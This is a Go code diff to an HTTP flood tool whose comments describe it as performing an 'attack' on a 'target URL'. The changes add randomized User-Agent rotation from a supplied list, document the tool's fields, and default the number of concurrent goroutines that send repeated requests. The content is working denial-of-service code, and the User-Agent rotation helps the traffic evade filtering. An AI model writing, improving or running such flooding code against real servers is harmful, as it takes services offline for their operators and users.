@@ -11,12 +11,13 @@ import (
 )
 
 type HTTPFlood struct {
-	Context       context.Context
-	MaxRequests   uint64
-	NumGoroutines int
-	RequestMethod string
-	RequestURL    string
-	RequestBody   io.Reader
+	Context       context.Context // controls how long the attack is performed for
+	RequestURL    string          // target URL for the attack
+	RequestMethod string          // for ex: "GET"
+	RequestBody   io.Reader       // optional, defaults to nil
+	UserAgents    []string        // optional, randomly selected from list
+	MaxRequests   uint64          // optional, defaults to no maximum
+	NumGoroutines int             // optional, defaults to 1
 }
 
 // Attack sends requests in a loop (with the given number of concurrent goroutines)
@@ -26,6 +27,10 @@ func (hf *HTTPFlood) Attack() error {
 	errChan := make(chan error)
 	defer close(errChan)
 	wg := &sync.WaitGroup{}
+
+	if hf.NumGoroutines <= 0 {
+		hf.NumGoroutines = 1
+	}
 
 	for i := 0; i < hf.NumGoroutines; i++ {
 		go execHTTPFlood(hf, errChan, wg, &numSent)
@@ -54,7 +59,7 @@ func execHTTPFlood(hf *HTTPFlood, errChan chan<- error, wg *sync.WaitGroup, numS
 		}
 
 		req, err := http.NewRequestWithContext(hf.Context, hf.RequestMethod, hf.RequestURL, hf.RequestBody)
-		req.Header.Add("User-Agent", RandUserAgent(nil))
+		req.Header.Add("User-Agent", RandUserAgent(hf.UserAgents))
 		if err != nil {
 			errChan <- err
 			return
